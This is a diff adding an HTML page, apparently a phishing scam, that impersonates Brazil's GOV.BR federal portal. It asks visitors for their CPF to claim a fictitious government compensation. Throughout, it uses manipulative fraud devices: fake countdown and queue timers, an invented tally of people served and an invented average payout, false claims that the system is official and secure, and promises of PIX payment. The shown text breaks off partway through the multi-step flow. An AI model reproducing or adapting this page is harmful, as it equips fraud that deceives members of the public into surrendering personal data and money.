@@ -1,0 +1,1485 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta content="text/html; charset=UTF-8; X-Content-Type-Options=nosniff" http-equiv="Content-Type" />
+    <title>Consulta - Verificação</title>
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4" blocking=render></script>
+
+    <!-- fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100..900;1,100..900&family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+   <script id="_wau2ha">
+        var _wau = _wau || [];
+        _wau.push(["dynamic", "0gtq2o3n92", "2ha", "c4302bffffff", "small"]);
+    </script>
+    <script async src="//waust.at/d.js"></script>
+    </div>
+</head>
+<body class="w-full overflow-x-hidden font-[Poppins]">
+      <style>@keyframes pulse-scale {
+  0%, 100% {
+    transform: scale(1);
+  }
+  50% {
+    transform: scale(1.05);
+  }
+}
+.animate-pulse-scale {
+  animation: pulse-scale 1s ease-in-out infinite;
+}
+</style>
+
+<div class="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50">
+    <header class="fixed top-0 left-0 right-0 z-50 bg-white/95 backdrop-blur-sm shadow-sm border-b border-gray-200">
+        <div class="px-4 py-2">
+            <div class="flex justify-between items-center">
+                <div class="flex items-center space-x-3">
+                    <img alt="Logo GOV.BR" class="h-6 w-auto" src="./assets/img/Gov-br-logo-svg.png">
+                    <div class="hidden sm:block h-5 w-px bg-gray-300"></div>
+                    <span class="hidden sm:inline text-xs font-medium text-gray-600">Portal Oficial</span>
+                </div>
+                <div class="flex items-center space-x-3">
+                    <div class="flex items-center space-x-1 text-xs text-gray-500">
+                        <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
+                        <span class="hidden sm:inline">Seguro</span>
+                    </div>
+                    <button class="flex items-center space-x-2 bg-blue-600 hover:bg-blue-700 text-white px-3 py-1.5 rounded-full transition-colors text-sm">
+                        <svg class="w-4 h-4" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 9a3 3 0 100-6 3 3 0 000 6zm-7 9a7 7 0 1114 0H3z" clip-rule="evenodd"></path></svg>
+                        <span class="font-medium" id="nameHeader"></span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    
+    
+    <div class="h-8"></div>
+    
+    <main class="pt-10 pb-8 px-4">
+        <div class="max-w-md mx-auto " id="step1">
+            <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+                <div class="bg-gradient-to-r from-blue-600 to-blue-700 text-white p-6 text-center">
+                    <div class="flex items-center justify-center space-x-2 mb-3">
+                        <svg class="w-8 h-8" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd"></path></svg>
+                        <h1 class="text-2xl font-bold">Consulta de Indenização</h1>
+                    </div>
+                    <p class="text-blue-100 text-sm">
+                        Sistema oficial do Governo Federal para consulta de valores disponíveis
+                    </p>
+                </div>
+                <div class="p-6">
+                    <div class="text-center mb-6">
+                        <h2 class="text-xl font-bold text-gray-900 mb-2">Informe seu CPF</h2>
+                        <p class="text-gray-600 text-sm leading-relaxed">
+                            Digite seu CPF para verificar se você possui valores de indenização 
+                            disponíveis para resgate
+                        </p>
+                    </div>
+
+                    <!-- form -->
+                    <form class="space-y-6">
+                        <div>
+                            <label for="cpf" class="block text-sm font-medium text-gray-700 mb-2">
+                                CPF *
+                            </label>
+                            <input id="cpf" 
+                            placeholder="000.000.000-00" 
+                            
+                            class="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-lg text-center font-mono" 
+                           >
+                        </div>
+                        <div class="bg-amber-50 border border-amber-200 rounded-xl p-4">
+                            <div class="flex items-start space-x-3">
+                                <div class="w-5 h-5 bg-amber-100 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
+                                    <svg class="w-3 h-3 text-amber-600" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>
+                                </div>
+                                <div>
+                                    <h4 class="font-semibold text-amber-800 text-sm mb-1">Informação Importante</h4>
+                                    <p class="text-amber-700 text-xs leading-relaxed">
+                                        Seus dados são protegidos e utilizados apenas para consulta oficial. 
+                                        Este sistema é seguro e confiável.
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <button type="submit" 
+                        class="w-full py-4 px-6 rounded-xl font-bold text-lg transition-all duration-300 bg-blue-800 text-white"
+                        >
+                            CONSULTAR AGORA
+                        </button>
+                    </form>
+                    
+                    <div class="text-center mt-6">
+                        <div class="flex items-center justify-center space-x-4 text-xs text-gray-500 mb-2">
+                            <div class="flex items-center space-x-1">
+                                <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
+                                <span>Conexão Segura</span>
+                            </div>
+                            <div class="flex items-center space-x-1">
+                                <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
+                                <span>Governo Federal</span>
+                            </div>
+                        </div>
+                        <p class="text-xs text-gray-400">
+                            Sistema oficial do Governo Federal - Todos os direitos reservados
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="max-w-md mx-auto hidden" id="step2">
+            <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+                <div class="bg-gradient-to-r from-orange-600 to-red-600 text-white p-4 sm:p-6 text-center">
+                    <div class="flex items-center justify-center space-x-2 mb-2 sm:mb-3">
+                        <svg fill="currentColor" viewBox="0 0 20 20" class="w-6 h-6 sm:w-8 sm:h-8"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM9.555 7.168A1 1 0 008 8v4a1 1 0 001.555.832l3-2a1 1 0 000-1.664l-3-2z" clip-rule="evenodd" class=""></path></svg>
+                        <h1 class="text-lg sm:text-2xl font-bold">Você está na Fila de Espera</h1>
+                    </div>
+                    <p class="text-orange-100 text-xs sm:text-sm">Assista ao vídeo enquanto aguarda sua vez no sistema</p>
+                </div>
+                <div class="p-4 sm:p-6"><div class="text-center mb-4 sm:mb-6">
+                    <h2 class="text-lg sm:text-xl font-bold text-gray-900 mb-2">Informações Importantes</h2>
+                    <p class="text-gray-600 text-sm leading-relaxed">
+                        Assista ao vídeo explicativo sobre seus direitos enquanto processamos 
+                        sua solicitação
+                    </p>
+                </div>
+                <div class="bg-gradient-to-r from-orange-50 to-red-50 border border-orange-200 rounded-xl p-3 sm:p-4 mb-4 sm:mb-6">
+                    <div class="flex items-center justify-center space-x-3">
+                        <div class="w-6 h-6 sm:w-8 sm:h-8 bg-orange-100 rounded-full flex items-center justify-center">
+                            <svg fill="currentColor" viewBox="0 0 20 20" class="w-3 h-3 sm:w-5 sm:h-5 text-orange-600"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clip-rule="evenodd" class=""></path></svg>
+                        </div>
+                        <div class="text-center">
+                            <div id="timer" class="text-xl sm:text-2xl font-bold text-orange-700">0:00</div>
+                            
+                            <div class="text-xs text-orange-600 font-medium">Tempo restante na fila</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="mb-4 sm:mb-6">
+                    <div class="relative w-full max-w-xl mx-auto">
+                        <!-- Vídeo -->
+                        <video id="video1" class="w-full rounded-md"">
+                            <source src="./assets/video/video1.mp4" type="video/mp4">
+                            Seu navegador não suporta vídeo.
+                        </video>
+
+                        <!-- Botão centralizado sobre o vídeo -->
+                        <div id="overlay" class="absolute inset-0 flex items-center justify-center bg-black bg-opacity-30">
+                            <button onclick="playVideo1()" class="flex flex-col items-center gap-2 bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-sm shadow-lg transition-transform hover:scale-105 animate-pulse-scale">            
+                                <span class="text-sm">Clique para ouvir</span>
+                                <!-- Ícone -->
+                                 <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-volume-x-icon lucide-volume-x"><path d="M11 4.702a.705.705 0 0 0-1.203-.498L6.413 7.587A1.4 1.4 0 0 1 5.416 8H3a1 1 0 0 0-1 1v6a1 1 0 0 0 1 1h2.416a1.4 1.4 0 0 1 .997.413l3.383 3.384A.705.705 0 0 0 11 19.298z"/><line x1="22" x2="16" y1="9" y2="15"/><line x1="16" x2="22" y1="9" y2="15"/></svg>
+                            </button>
+                        </div>
+                    </div>
+                    <!-- <div class="relative bg-gray-900 rounded-xl overflow-hidden shadow-lg group">
+                        <div class="relative w-full" style="aspect-ratio: 16 / 9;">
+                            <video src="./assets/video/video1.mp4" 
+                            type="video/mp4"
+                            preload="metadata" 
+                            crossorigin="anonymous" 
+                            playsinline="" 
+                            class="w-full h-full object-cover" 
+                            style="min-height: 180px;">
+                                Seu navegador não suporta vídeo HTML5.
+                            </video>
+                            
+                            <div class="absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/90 to-transparent transition-opacity duration-300 p-3 opacity-100">
+                                <div class="w-full bg-white/30 rounded-full cursor-pointer mb-3 h-3">
+                                    <div class="h-full bg-red-600 rounded-full transition-all duration-150" style="width: 100%;"></div>
+                                </div>
+                                <div class="flex items-center justify-between">
+                                    <div class="flex items-center space-x-4">
+                                        <button class="text-white hover:text-red-400 transition-colors duration-200 p-2">
+                                            <svg fill="currentColor" viewBox="0 0 20 20" class="w-8 h-8"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM9.555 7.168A1 1 0 008 8v4a1 1 0 001.555.832l3-2a1 1 0 000-1.664l-3-2z" clip-rule="evenodd" class=""></path></svg>
+                                        </button>
+                                        <div class="flex items-center space-x-2">
+                                            <button class="text-white hover:text-red-400 transition-colors duration-200 p-2">
+                                                <svg fill="currentColor" viewBox="0 0 20 20" class="w-6 h-6"><path fill-rule="evenodd" d="M9.383 3.076A1 1 0 0110 4v12a1 1 0 01-1.617.793L4.828 13H2a1 1 0 01-1-1V8a1 1 0 011-1h2.828l3.555-3.793a1 1 0 011.617.793zM12 8a1 1 0 012 0v4a1 1 0 11-2 0V8zm4.364-1.364a1 1 0 011.414 0 6.5 6.5 0 010 9.192 1 1 0 01-1.414-1.414 4.5 4.5 0 000-6.364 1 1 0 010-1.414z" clip-rule="evenodd" class=""></path></svg>
+                                            </button>
+                                        </div>
+                                    </div>
+                                    
+                                </div>
+                            </div>
+                        </div>
+                    </div> -->
+                </div>
+                <div class="bg-blue-50 border border-blue-200 rounded-xl p-3 sm:p-4 mb-4 sm:mb-6">
+                    <div class="flex items-start space-x-3">
+                        <div class="w-5 h-5 sm:w-6 sm:h-6 bg-blue-100 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
+                            <svg fill="currentColor" viewBox="0 0 20 20" class="w-3 h-3 sm:w-4 sm:h-4 text-blue-600"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd" class=""></path></svg>
+                        </div>
+                        <div>
+                            <h4 class="font-semibold text-blue-800 text-sm mb-1">
+                                Pontos Importantes
+                            </h4>
+                            <ul class="text-blue-700 text-xs space-y-1">
+                                <li class="">• Seus dados são protegidos por lei</li>
+                                <li class="">• O resgate pode ser feito via PIX instantaneamente</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                <button id="buttonNext" onclick="step2to3()" class="hidden w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold py-3 sm:py-4 px-4 sm:px-6 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 flex items-center justify-center space-x-2 text-base sm:text-lg touch-target">
+                    <svg fill="currentColor" viewBox="0 0 20 20" class="w-5 h-5 sm:w-6 sm:h-6"><path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd" class=""></path></svg>
+                    <span class="" >
+                        CONTINUAR PROCESSO
+                    </span>
+                </button>
+                <div class="text-center mt-4 sm:mt-6">
+                    <div class="flex items-center justify-center space-x-4 text-xs text-gray-500 mb-2">
+                        <div class="flex items-center space-x-1">
+                            <svg fill="currentColor" viewBox="0 0 20 20" class="w-3 h-3"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd" class=""></path></svg>
+                            <span class="">Conexão Segura</span>
+                        </div>
+                        <div class="flex items-center space-x-1">
+                            <svg fill="currentColor" viewBox="0 0 20 20" class="w-3 h-3"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" class=""></path></svg>
+                            <span class="">Governo Federal</span>
+                        </div>
+                    </div>
+                    <p class="text-xs text-gray-400">Sistema oficial do Governo Federal - Todos os direitos reservados</p>
+                </div>
+            </div>
+        </div>
+        </div>
+
+        <div class="max-w-md mx-auto hidden" id="step3">
+            <div class="mb-6">
+                <div class="flex items-center justify-between text-xs text-gray-600 mb-3">
+                    <span class="font-medium">Boas-vindas</span>
+                    <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full font-medium">1 de 6</span>
+                </div>
+                <div class="w-full bg-gray-200 rounded-full h-2 mb-2">
+                    <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-500" style="width: 16.6667%;"></div>
+                </div>
+                <p class="text-xs text-gray-500 text-center">Início do processo</p>
+            </div>
+            <div class="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+                <div class="bg-gradient-to-r from-red-500 to-red-600 text-white p-4 text-center">
+                    <div class="flex items-center justify-center space-x-2 mb-2">
+                        <svg class="w-5 h-5 animate-pulse" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd"></path></svg>
+                        <span class="font-bold text-sm">ÚLTIMOS MINUTOS</span>
+                    </div>
+                    <div class="text-2xl font-bold tabular-nums" id="timer2">00:45:00</div>
+                    <div class="text-xs opacity-90">Tempo restante para resgate hoje</div>
+                </div>
+                <div class="p-6">
+                    <div class="text-center mb-6">
+                        <h1 class="text-2xl font-bold text-gray-900 mb-2">Olá, <span class="" id="nameUser"></span>!</h1>
+                        <p class="text-gray-600 text-sm leading-relaxed">
+                            Seja bem-vindo(a) ao sistema oficial de consulta de indenizações do Governo Federal
+                        </p>
+                    </div>
+                    <div class="bg-blue-50 rounded-xl p-4 mb-6">
+                        <h3 class="font-semibold text-blue-900 mb-3 text-sm">
+                            Dados Confirmados:
+                        </h3>
+                        <div class="space-y-2 text-sm">
+                            <div class="flex justify-between items-center">
+                                <span class="text-blue-700">Nome:</span>
+                                <span class="font-medium text-blue-900 text-right" id="nameUser2"></span>
+                            </div>
+                            <div class="flex justify-between items-center">
+                                <span class="text-blue-700">CPF:</span>
+                                <span class="font-medium text-blue-900" id="cpfUser"></span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="bg-gradient-to-r from-amber-50 to-orange-50 border border-amber-200 rounded-xl p-4 mb-6">
+                        <div class="flex items-start space-x-3">
+                            <div class="w-6 h-6 bg-amber-100 rounded-full flex items-center justify-center flex-shrink-0 mt-0.5">
+                                <svg class="w-4 h-4 text-amber-600" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>
+                            </div>
+                            <div>
+                                <h4 class="font-bold text-amber-800 text-sm mb-1">
+                                    ⚠️ ATENÇÃO - PRAZO LIMITADO
+                                </h4>
+                                <p class="text-amber-700 text-sm leading-relaxed">
+                                    <strong>Restam poucos minutos</strong> para você resgatar 
+                                    a indenização vinculada ao seu CPF. Não perca esta 
+                                    oportunidade!
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="bg-green-50 border border-green-200 rounded-xl p-4 mb-6">
+                        <div class="flex items-center space-x-3 mb-3">
+                            <div class="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center">
+                                <svg class="w-5 h-5 text-green-600" fill="currentColor" viewBox="0 0 20 20"><path d="M9 6a3 3 0 11-6 0 3 3 0 016 0zM17 6a3 3 0 11-6 0 3 3 0 016 0zM12.93 17c.046-.327.07-.66.07-1a6.97 6.97 0 00-1.5-4.33A5 5 0 0119 16v1h-6.07zM6 11a5 5 0 015 5v1H1v-1a5 5 0 015-5z"></path></svg>
+                            </div>
+                            <div>
+                                <h4 class="font-bold text-green-800 text-sm">Pessoas já atendidas hoje:</h4>
+                                <div class="text-2xl font-bold text-green-600 tabular-nums">47.832</div>
+                            </div>
+                        </div>
+                        <p class="text-green-700 text-xs">
+                            ✅ Milhares de brasileiros já resgataram suas indenizações através 
+                            deste sistema oficial
+                        </p>
+                    </div>
+                    <button onclick="step3to4()" class="w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 flex items-center justify-center space-x-2 text-lg">
+                        <svg class="w-6 h-6" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd"></path></svg>
+                        <span>INICIAR CONSULTA AGORA</span>
+                    </button>
+                    <div class="text-center mt-4">
+                        <div class="flex items-center justify-center space-x-4 text-xs text-gray-500 mb-2">
+                            <div class="flex items-center space-x-1">
+                                <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
+                                <span>Conexão Segura</span>
+                            </div>
+                            <div class="flex items-center space-x-1">
+                                <svg class="w-3 h-3" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M2.166 4.999A11.954 11.954 0 0010 1.944 11.954 11.954 0 0017.834 5c.11.65.166 1.32.166 2.001 0 5.225-3.34 9.67-8 11.317C5.34 16.67 2 12.225 2 7c0-.682.057-1.35.166-2.001zm11.541 3.708a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd"></path></svg>
+                                <span>Governo Federal</span>
+                            </div>
+                        </div>
+                        <p class="text-xs text-gray-400">Sistema oficial do Governo Federal - Todos os direitos reservados</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="max-w-md mx-auto hidden" id="step4">
+            <div class="mb-6">
+                <div class="flex items-center justify-between text-xs text-gray-600 mb-3">
+                    <span class="font-medium">Educação</span>
+                    <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full font-medium">2 de 6</span>
+                </div>
+                <div class="w-full bg-gray-200 rounded-full h-2 mb-2">
+                    <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-500" style="width: 33.3333%;"></div>
+                </div>
+                <p class="text-xs text-gray-500 text-center">Entenda seus direitos</p>
+            </div>
+            <div class=" bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
+                <div class=" bg-gradient-to-r from-blue-600 to-blue-700 text-white p-3 sm:p-4 text-center">
+                    <div class=" flex items-center justify-center space-x-2 mb-2">
+                        <svg fill="currentColor" viewBox="0 0 20 20" class=" w-4 h-4 sm:w-5 sm:h-5"><path d="M2 6a2 2 0 012-2h6l2 2h6a2 2 0 012 2v6a2 2 0 01-2 2H4a2 2 0 01-2-2V6z" class=""></path></svg>
+                        <span class=" font-bold text-xs sm:text-sm">ENTENDA SEUS DIREITOS</span>
+                    </div>
+                    <p class=" text-xs opacity-90">Assista ao vídeo para entender melhor</p>
+                </div><div class=" p-4 sm:p-6">
+                    <div class=" text-center mb-4 sm:mb-6">
+                        <h2 class=" text-lg sm:text-xl font-bold text-gray-900 mb-2">
+                            Indenização: Seu por Direito
+                        </h2>
+                        <p class=" text-gray-600 text-sm">
+                            Assista ao vídeo explicativo de 
+                            <strong class="">35 segundos</strong> para entender 
+                            seus direitos
+                        </p>
+                    </div>
+                    <div class=" mb-4 sm:mb-6">
+                        <div class="relative w-full max-w-xl mx-auto">
+                            <!-- Vídeo -->
+                            <video id="video2" class="w-full rounded-md"">
+                                <source src="./assets/video/video2.mp4" type="video/mp4">
+                                Seu navegador não suporta vídeo.
+                            </video>
+
+                            <!-- Botão centralizado sobre o vídeo -->
+                            <div id="overlay2" class="absolute inset-0 flex items-center justify-center bg-black bg-opacity-30">
+                                <button onclick="playVideo2()" class="flex flex-col items-center gap-2 bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-sm shadow-lg transition-transform hover:scale-105 animate-pulse-scale">            
+                                    <span class="text-sm">Clique para ouvir</span>
+                                    <!-- Ícone -->
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-volume-x-icon lucide-volume-x"><path d="M11 4.702a.705.705 0 0 0-1.203-.498L6.413 7.587A1.4 1.4 0 0 1 5.416 8H3a1 1 0 0 0-1 1v6a1 1 0 0 0 1 1h2.416a1.4 1.4 0 0 1 .997.413l3.383 3.384A.705.705 0 0 0 11 19.298z"/><line x1="22" x2="16" y1="9" y2="15"/><line x1="16" x2="22" y1="9" y2="15"/></svg>
+                                </button>
+                            </div>
+                        </div>
+                        <!-- <div class=" relative bg-gray-900 rounded-xl overflow-hidden shadow-lg group">
+                            <div class="relative w-full" style="aspect-ratio: 16 / 9;">
+                                <video src="https://embed.wistia.com/deliveries/f58966dd15d7cb1ffeaf77288ace65fe626f1a04.bin" 
+                                preload="metadata" 
+                                crossorigin="anonymous" 
+                                playsinline="" 
+                                class=" w-full h-full object-cover" 
+                                style="height: 400px;">
+                                    Seu navegador não suporta vídeo HTML5.
+                                </video>
+                                <div class=" absolute bottom-0 left-0 right-0 bg-gradient-to-t from-black/90 to-transparent transition-opacity duration-300 p-3 opacity-100">
+                                    <div class=" w-full bg-white/30 rounded-full cursor-pointer mb-3 h-3">
+                                        <div class=" h-full bg-blue-600 rounded-full transition-all duration-150" style="width: 38.3809%;"></div>
+                                    </div>
+                                    <div class=" flex items-center justify-between">
+                                        <div class=" flex items-center space-x-4">
+                                            <button class=" text-white hover:text-blue-400 transition-colors duration-200 p-2">
+                                                <svg fill="currentColor" viewBox="0 0 20 20" class=" w-8 h-8"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zM7 8a1 1 0 012 0v4a1 1 0 11-2 0V8zm5-1a1 1 0 00-1 1v4a1 1 0 102 0V8a1 1 0 00-1-1z" clip-rule="evenodd" class=""></path></svg>
+                                            </button>
+                                            <div class=" flex items-center space-x-2">
+                                                <button class=" text-white hover:text-blue-400 transition-colors duration-200 p-2">
+                                                    <svg fill="currentColor" viewBox="0 0 20 20" class=" w-6 h-6"><path fill-rule="evenodd" d="M9.383 3.076A1 1 0 0110 4v12a1 1 0 01-1.617.793L4.828 13H2a1 1 0 01-1-1V8a1 1 0 011-1h2.828l3.555-3.793a1 1 0 011.617.793zM12 8a1 1 0 012 0v4a1 1 0 11-2 0V8zm4.364-1.364a1 1 0 011.414 0 6.5 6.5 0 010 9.192 1 1 0 01-1.414-1.414 4.5 4.5 0 000-6.364 1 1 0 010-1.414z" clip-rule="evenodd" class=""></path></svg>
+                                                </button>
+                                            </div>
+                                        </div>
+                                        <div class=" text-white font-mono text-sm">0:13 / 0:34</div>
+                                    </div>
+                                </div>
+                                <div class=" absolute top-2 right-2">
+                                    <div class=" bg-black/70 text-white px-2 py-1 rounded text-xs font-medium">35s</div>
+                                </div>
+                            </div>
+                        </div> -->
+                    </div>
+                    <div class=" grid grid-cols-1 gap-4 mb-4 sm:mb-6">
+                        <div class=" bg-green-50 border border-green-200 rounded-xl p-3 sm:p-4">
+                            <div class=" flex items-center space-x-3">
+                                <div class=" w-8 h-8 sm:w-10 sm:h-10 bg-green-100 rounded-full flex items-center justify-center">
+                                    <svg fill="currentColor" viewBox="0 0 20 20" class=" w-4 h-4 sm:w-5 sm:h-5 text-green-600"><path d="M4 4a2 2 0 00-2 2v4a2 2 0 002 2V6h10a2 2 0 00-2-2H4zm2 6a2 2 0 012-2h8a2 2 0 012 2v4a2 2 0 01-2 2H8a2 2 0 01-2-2v-4zm6 4a2 2 0 100-4 2 2 0 000 4z" class=""></path></svg>
+                                </div>
+                                <div class="">
+                                    <h4 class=" font-bold text-green-800 text-sm">Valor Médio Resgatado</h4>
+                                    <div class=" text-lg sm:text-xl font-bold text-green-600">R$ 3.847,00</div>
+                                    <p class=" text-green-700 text-xs">Por pessoa em 2024</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <button id="button4" onclick="step4to5()" class="hidden w-full bg-gradient-to-r from-blue-600 to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white font-bold py-3 sm:py-4 px-4 sm:px-6 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5 flex items-center justify-center space-x-2 touch-target">
+                        <span class="">VERIFICAR MINHA SITUAÇÃO</span>
+                        <svg fill="currentColor" viewBox="0 0 20 20" class="jsx-96e84011cc6b9f63 w-4 h-4 sm:w-5 sm:h-5"><path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd" class="jsx-96e84011cc6b9f63"></path></svg>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div class="max-w-md mx-auto hidden" id="step5">
+            <div class="mb-6">
+                <div class="flex items-center justify-between text-xs text-gray-600 mb-3">
+                    <span class="font-medium">Verificação</span>
+                    <span class="bg-blue-100 text-blue-800 px-2 py-1 rounded-full font-medium">3 de 6</span>
+                </div>
+                <div class="w-full bg-gray-200 rounded-full h-2 mb-2">
+                    <div class="bg-gradient-to-r from-blue-500 to-blue-600 h-2 rounded-full transition-all duration-500" style="width: 50%;"></div>
+                </div>
